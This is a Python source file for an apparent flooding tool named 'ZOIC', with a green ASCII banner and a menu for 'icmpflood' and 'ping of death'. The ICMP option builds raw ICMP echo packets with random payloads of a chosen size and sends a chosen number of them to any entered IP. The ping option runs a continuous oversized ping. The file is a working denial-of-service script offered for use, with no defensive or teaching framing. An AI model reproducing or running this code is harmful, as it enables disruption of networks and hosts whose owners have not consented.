import os
import sys
import random
import socket
import struct
import time
import subprocess

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m" 
    RADICAL_RED = "\033[38;5;160m"
    DARK_GREEN = "\033[38;5;28m"
    SUPER_BRIGHT_LIME_GREEN = '\033[38;2;102;255;102m'
    BRIGHT_WHITE = '\033[97m'
    BRIGHT_LIME_GREEN_RGB = '\033[38;2;50;205;50m'

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.SUPER_BRIGHT_LIME_GREEN + """
    ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗     ╚═══██╗
    ███████╗██║  ██║   ██║   ███████╗██║  ██║    ██████╔╝
    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝  
    """+ TextColors.RESET)
    print(TextColors.BRIGHT_LIME_GREEN_RGB + """
    --------------------------------------
    Revolt : https://rvlt.gg/PeewQeV9
    Github : https://github.com/madanokr001
    coded by 건우Sec
    --------------------------------------
        
    Layer3 commands line:
        
    icmp  |  icmpflood
    ping  |  ping of death
    exit  |  exit zoic menu

          
"""+ TextColors.RESET)

def layer3():
    while True:
        logo()
        select = input(TextColors.SUPER_BRIGHT_LIME_GREEN + """═══[root@ZOIC~$]                                                                   
═══> """ + TextColors.RESET)

        if select == "icmp" or select.lower() == "1":
            def icmp_packets(seq, packet_id, byte_size):
                header = struct.pack('bbHHh', 8, 0, 0, packet_id, seq)
                checksum = checksums(header)
                header = struct.pack('bbHHh', 8, 0, socket.htons(checksum), packet_id, seq)
                byte_payload = bytes(random.randint(0, 255) for _ in range(byte_size))
                return header + byte_payload

            def checksums(source_string):
                sum = 0
                for i in range(0, len(source_string), 2):
                    if i + 1 < len(source_string):
                        sum += (source_string[i] << 8) + source_string[i + 1]
                    else:
                        sum += (source_string[i] << 8)
                sum = (sum >> 16) + (sum & 0xFFFF)
                sum += (sum >> 16)
                return ~sum & 0xFFFF

            def send_packets(target_ip, byte_size, count):
                packet_id = random.randint(0, 65535)
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
                    for i in range(count):
                        packet = icmp_packets(i + 1, packet_id, byte_size)
                        sock.sendto(packet, (target_ip, 0))
                        print(TextColors.CYAN + f'[+] IP Address : {target_ip} [+] ICMP Packet : {i + 1}'+ TextColors.RESET)
                        time.sleep(0.01)

            target = input(TextColors.WHITE + "IP > "+ TextColors.RESET)
            byte_size = int(input(TextColors.WHITE + "Bytes > "+ TextColors.RESET))
            count = int(input(TextColors.WHITE + "Count > "+ TextColors.RESET))
            send_packets(target, byte_size, count)

        elif select == "ping" or select.lower() == "2":

            ip = input(TextColors.WHITE +"IP > "+ TextColors.RESET)
            Bytes = input(TextColors.WHITE +"Bytes > "+ TextColors.RESET)

            subprocess.run(['ping', '-t', ip, '-l', str(Bytes)], check=True)

            input("")
            
            
        elif select == "3" or select.lower() == "3":
            sys.exit()
    
             


if __name__ == "__main__":
    layer3()
